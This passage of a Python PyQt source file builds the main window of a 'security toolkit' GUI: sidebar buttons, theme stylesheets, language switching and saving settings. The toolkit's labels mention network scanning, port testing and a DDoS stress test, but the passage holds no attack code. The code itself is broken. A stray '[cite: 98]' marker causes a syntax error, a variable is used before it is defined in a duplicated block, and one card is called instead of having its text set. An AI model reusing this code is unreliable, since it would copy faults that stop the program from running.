        content_v_layout.addWidget(self.pages)
        main_layout.addWidget(self.content_frame)

        # Conexões Sidebar
        self.btn_home.clicked.connect(lambda: self.safe_change_page(0))
        self.btn_tools.clicked.connect(lambda: self.safe_change_page(1))
        self.btn_scanner.clicked.connect(lambda: self.safe_change_page(2))
        self.btn_scripts.clicked.connect(lambda: self.safe_change_page(3))
        self.btn_logs.clicked.connect(lambda: self.safe_change_page(4))
        self.btn_config.clicked.connect(lambda: self.safe_change_page(5))

    def _make_sidebar_button(self, text, icon):
        btn = QPushButton(f"  {icon} {text}")
        btn.setObjectName("SidebarButton")
        btn.setFixedHeight(45)
        btn.setCursor(Qt.CursorShape.PointingHandCursor)
        # O estilo CSS idealmente deve vir do theme_manager ou um arquivo .qss
        return btn

    # ----------------- Gerenciamento de Tema -----------------

    def get_theme_colors(self, theme_key=None):
        return THEMES.get(theme_key or self.theme_manager.current_theme, THEMES['dark'])

    def _apply_theme(self, theme_key):
        """Aplica o StyleSheet ao Main Window e atualiza os Cards."""
        T = self.get_theme_colors(theme_key)
        neon_color = self.theme_manager.neon_color 
        
        style = f"""
        /* --- ESTILOS GERAIS --- */
        QMainWindow {{
            background-color: {T['bg_main']}; /* Fundo principal */
        }}
        
        /* --- SIDEBAR --- */
        QFrame#Sidebar {{
            background-color: {T['bg_sidebar']};
        }}
        
        /* --- PÁGINAS DE CONTEÚDO --- */
        QFrame#ContentFrame, QWidget#PageWidget {{ 
            background-color: {T['bg_main']}; /* Fundo das páginas de conteúdo */
        }}
        
        /* --- TEXTOS E LABELS --- */
        QLabel {{
            color: {T['text_main']};
        }}
        QLabel#AuraTitle {{ 
            color: {neon_color}; 
        }}
        
        /* --- SIDEBAR BUTTONS --- */
        QPushButton#SidebarButton {{
            background-color: {T['bg_button']};
            color: {T['text_main']};
            border: none;
            border-radius: 8px;
            padding-left: 15px;
        }}
        QPushButton#SidebarButton:hover {{
            background-color: {T['bg_button_hover']};
            color: {T['text_main']};
        }}

        /* --- INPUTS E GRUPOS (ConfigPage e ScannerPage) --- */
        QGroupBox {{
            color: {T['text_main']};
            border: 1px solid {T['border_card']};
            border-radius: 10px;
            padding-top: 20px;
            margin-top: 10px;
            /* ⚠️ CORREÇÃO CRÍTICA: Força o fundo do QGroupBox a ser o fundo principal */
            background-color: {T['bg_main']}; 
        }}
        
        QLineEdit {{
            background-color: {T['bg_input']}; 
            color: {T['text_main']};
            border: 1px solid {T['border_card']};
            border-radius: 5px;
            padding: 5px;
        }}
        
        QScrollArea {{
            /* ⚠️ CORREÇÃO: Força o fundo do QScrollArea e sua viewport */
            background-color: {T['bg_main']}; 
            border: none;
        }}
        QScrollArea QWidget {{ /* O widget interno do scroll area */
            background-color: {T['bg_main']};
        }}

        /* ⚠️ CORREÇÃO CRÍTICA: Componentes de controle na ConfigPage */
        QComboBox {{
            background-color: {T['bg_input']}; 
            color: {T['text_main']};
            border: 1px solid {T['border_card']};
            border-radius: 5px;
            padding: 3px;
        }}
        QRadioButton {{
            color: {T['text_main']};
            background-color: {T['bg_main']};
        }}
        
        /* --- OUTROS BOTÕES (ScannerPage) --- */
        QPushButton {{
            background-color: {T['bg_button']};
            color: {T['text_main']};
            border: none;
            border-radius: 5px;
            padding: 8px 15px;
        }}
        QPushButton:hover {{
            background-color: {T['bg_button_hover']};
        }}
        """
        self.setStyleSheet(style)
        
        for card in self.findChildren(NeonCard):
            card.set_neon_color(neon_color, self.theme_manager.current_theme)


    # ----------------- Métodos de Configuração (Chamados pela ConfigPage) -----------------

    def apply_base_theme(self, theme_name):
        self.theme_manager.set_base_theme(theme_name)
        self._apply_theme(theme_name)
        
    def set_global_neon_color(self, color):
        self.theme_manager.set_neon_color(color)
        self._apply_theme(self.theme_manager.current_theme) 

    def apply_language(self, lang_name):
        # ... (seu código de mapeamento atual) ... 
        
        new_L = load_language_json(lang_code, self.base_dir) 
        self.L = new_L
        self.current_lang_code = lang_code
        
        self.update_ui_language(lang_code) [cite: 98]
        
        # ADICIONE ESTA LINHA: Força o redesenho nítido após a troca de texto
        QTimer.singleShot(50, self._refresh_neon_fix)
        
        lang_map = {
            "Português": "pt", "Inglês": "en", "Espanhol": "es", 
            "Francês": "fr", "Alemão": "de", "Italiano": "it",
            "Russo": "ru", "Chinês": "zh", "Coreano": "ko", 
            "Japonês": "ja", "Árabe": "ar"
        }
        
        lang_code = lang_map.get(lang_name, "pt")
        
        new_L = load_language_json(lang_code, self.base_dir) 
        self.L = new_L
        self.current_lang_code = lang_code
        
        self.update_ui_language(lang_code)
        
    # ----------------- Atualização de Idioma -----------------

    def update_ui_language(self, lang_code):
        """Atualiza todos os textos da UI com base no dicionário de idioma carregado (self.L)."""
        L = self.L 
        
        self.btn_home.setText("  " + lang_get(L, "sidebar.home", "🏠 Home"))
        self.btn_tools.setText("  " + lang_get(L, "sidebar.tools", "🛠️ Ferramentas"))
        self.btn_scanner.setText("  " + lang_get(L, "sidebar.scanner", "🛰️ Scanner")) 
        self.btn_scripts.setText("  " + lang_get(L, "sidebar.scripts", "📜 Scripts"))
        self.btn_logs.setText("  " + lang_get(L, "sidebar.logs", "📁 Logs"))
        self.btn_config.setText("  " + lang_get(L, "sidebar.settings", "⚙️ Configurações"))
        self.status_label.setText(lang_get(L, "header.status_ready", "Status: Pronto"))
        
        self.firewall_page.update_ui_language(L)
        self.config_page.update_ui_language(L) 
        self.scanner_page.update_ui_language(L)
        
        self.welcome_label.setText(lang_get(L, "home_page.welcome", "Bem-vindo ao AURA Security Toolkit!")) 
        
        self.card_scanner.set_texts(
            lang_get(L, "cards.scanner.title", "Varredura de Rede"),
            lang_get(L, "cards.scanner.subtitle", "Varre e detecta hosts")
        )
        self.card_stress(
            lang_get(L, "cards.stress.title", "Teste de Stress (DDoS)"), 
            lang_get(L, "cards.stress.subtitle", "Testar resiliência do alvo")
        )
        self.card_firewall.set_texts(
            lang_get(L, "cards.ports.title", "Analisador de Portas (Ex. Firewall)"),
            lang_get(L, "cards.ports.subtitle", "Testa portas específicas")
        )
        
        self.current_lang_code = lang_code 


    # ----------------- closeEvent (Persistência) -----------------
    
    def closeEvent(self, event):
        if hasattr(self, 'stress_page') and self.stress_page.executor:
            self.stress_page.executor.stop()
        
        self.user_settings['language'] = self.current_lang_code
        self.user_settings['theme'] = self.theme_manager.current_theme
        self.user_settings['neon_color'] = self.theme_manager.neon_color
        
        save_user_settings(self.base_dir, self.user_settings)
        
        super().closeEvent(event)

# --- EXECUÇÃO PRINCIPAL ---

if __name__ == "__main__":
    
    if getattr(sys, 'frozen', False):
        base_dir = os.path.dirname(sys.executable)
    else:
        base_dir = os.path.dirname(os.path.abspath(__file__))

    app = QApplication(sys.argv)
    
    palette = QPalette()
    palette.setColor(QPalette.ColorRole.Window, QColor(THEMES['dark']['bg_main']))
    app.setPalette(palette)
    
    window = MainWindow(base_dir)
    window.show()
    sys.exit(app.exec())
